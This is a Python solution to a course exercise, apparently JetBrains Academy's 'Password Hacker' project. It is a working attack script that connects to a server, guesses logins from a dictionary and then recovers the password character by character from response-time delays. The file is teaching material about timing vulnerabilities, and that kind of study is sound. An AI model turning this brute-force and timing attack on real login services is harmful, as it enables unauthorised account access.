# JetBrains Academy/Python Developer
# Project: Password Hacker
# Stage 5/5: Time vulnerability

from datetime import datetime
import itertools
import json
import socket
import string
import sys


class Generator:
    """Passwords or login generator. It takes values: characters, min_length, max_length, file.
    "characters" - a string of characters that will participate in the generation of words,
    the default is "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".
    "min_length" - the minimum length of the generated word, defaults to 1.
    "max_length" - the maximum length of the generated word, defaults to 8.
    "file" - path to the password dictionary file, empty by default.
    If the path to the password dictionary file is pass, the generator returns the words from the dictionary,
    otherwise it generates them based on the values from "characters" and "min_length"-"max_length"."""

    def __init__(self, characters=string.ascii_letters + string.digits, min_length=1, max_length=8, file=''):
        self._characters = characters
        self.min_length = min_length
        self._max_length = max_length
        self._file = file

    def __iter__(self):
        if not self._file:
            for length in range(self.min_length, self._max_length):
                for pas in itertools.product(self._characters, repeat=length):
                    yield ''.join(pas)
        else:
            with open(self._file, 'r') as file:
                yield from file


class BruteForce:
    def __init__(self):
        self.address = sys.argv[1]
        self.port = int(sys.argv[2])
        self.logins = Generator(file='logins.txt')
        self.passwords = Generator()

    def uppers(self, word):  # appendix from Stage 3
        """Generates all possible variants of the received string,
        replacing the characters with their uppercase counterpart."""
        for out_word in [''.join(i) for i in itertools.permutations(word + word.upper(), len(word))
                         if ''.join(i).lower() == word]:
            yield out_word

    def run(self):
        with socket.socket() as client_socket:
            client_socket.connect((self.address, self.port))

            # getting a valid login
            valid_login = ''
            for login in self.logins:
                request = json.dumps({'login': login.strip(), 'password': ' '})
                client_socket.send(request.encode())
                response = client_socket.recv(1024)
                answer = json.loads(response.decode())
                if answer['result'] == 'Wrong password!':
                    valid_login = login.strip()
                    break

            # getting a valid password
            valid_password = ''
            while answer['result'] != 'Connection success!':
                for char in string.ascii_letters + string.digits:
                    request = json.dumps({'login': valid_login, 'password': valid_password + char})
                    client_socket.send(request.encode())

                    start_time = datetime.now()  # catch a delay in the server response when the exception takes place
                    response = client_socket.recv(1024)
                    delay = datetime.now() - start_time

                    answer = json.loads(response.decode())
                    if delay.total_seconds() > 0.1 or answer['result'] == 'Connection success!':
                        valid_password += char
                        break
            print(request)


if __name__ == '__main__':
    brute = BruteForce()
    brute.run()

